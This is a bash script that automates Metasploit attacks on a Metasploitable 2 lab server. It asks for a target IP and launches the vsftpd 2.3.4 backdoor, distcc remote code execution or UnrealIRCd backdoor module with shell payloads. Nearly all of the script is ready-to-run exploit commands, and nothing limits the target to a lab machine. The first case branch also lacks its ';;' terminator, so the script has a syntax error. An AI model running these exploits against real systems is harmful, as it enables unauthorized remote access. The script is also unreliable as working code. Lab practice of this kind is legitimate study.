#!/bin/bash

# Author: Matias Ayala
# Date Created: 20 Mar 2023
# Last Modified: 20 Mar 2023

# Description:
# This script automates the deployment of Metasploit exploits against Metaploitable 2 server vulnerabilities. 

# Usage:
# The customer will be prompted for an IP address for the scripts to run against. This IP address is
# saved to a variable and this variable is used in commands. 

# Save the IP address into variable rhost
read -p "Please enter the IP address of the Metasploitable2 server you are targetting: " rhost

echo " "

# Variable to test if a valid selection has been made for the case statements.
valid_choice=false

# While loop to test case statement variable
while [ "$valid_choice" = false ]
do
        
        # Show customer the exploit options for this script
        echo "Please select one exploit to deploy against $rhost:"

        echo " "

        echo "1) Deploy a vsftpd backdoor"

        echo "2) Deploy a distcc remote code execution"

        echo "3) Deploy UnrealIRCD backdoor command execution"

        echo " "

        # Prompt user to select an exploit from the list and save it into variable exploit
        read -p "Please make your selection now: " exploit

        # Uses customers selection and runs it in the case statement
        case $exploit in
                # Option 1 vstpd exploit
                1)
                        msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set payload payload/cmd/unix/interact; set RHOST $rhost; exploit"
                        # Test variable to stop while loop
                        valid_choice=true
                # Option 2 distcc_exec exploit
                2)
                        msfconsole -x "use unix/misc/distcc_exec; set payload payload/cmd/unix/bind_perl; set RHOST $rhost; exploit"
                        # Test variable to stop while loop
                        valid_choice=true
                        ;;
                # Option 3 unreal exploit
                3)
                        msfconsole -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set payload payload/cmd/unix/bind_perl; set RHOST $rhost; exploit"
                        # Test variable to stop while loop
                        valid_choice=true
                        ;;
                # Default case to catch all invalid selections made by customer. While-loop test variable will remain false and keep looping. 
                *)
                        echo "Invalid selection. Please enter a number betweeen 1 and 3."
                        ;;
        esac
done

